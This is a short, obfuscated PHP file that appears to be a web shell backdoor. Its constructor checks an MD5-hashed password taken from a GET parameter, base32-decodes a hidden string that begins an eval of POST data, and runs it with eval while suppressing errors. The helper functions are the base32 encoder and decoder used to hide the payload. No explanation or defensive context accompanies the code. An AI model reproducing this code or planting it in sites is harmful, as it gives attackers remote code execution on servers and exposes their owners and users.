<?php
class IAXY{
        public $XGLB = null;
        public $NRAP = null;
        function __construct(){
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
        $this->XGLB = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->NRAP = @NSBJ($this->XGLB);
        @eval("/*ClBtOKG*/".$this->NRAP."/*ClBtOKG*/");
        }}}
new IAXY();
function BJGU($KHIM){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $CGOP = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($KHIM); $i < $j; $i++){
    $v <<= 8;
        $v += ord($KHIM[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $CGOP .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $CGOP .= $BASE32_ALPHABET[$v];}
    return $CGOP;}
function NSBJ($KHIM){
    $CGOP = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($KHIM); $i < $j; $i++){
        $v <<= 5;
        if ($KHIM[$i] >= 'a' && $KHIM[$i] <= 'z'){
            $v += (ord($KHIM[$i]) - 97);
        } elseif ($KHIM[$i] >= '2' && $KHIM[$i] <= '7') {
            $v += (24 + $KHIM[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $CGOP .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $CGOP;}
?>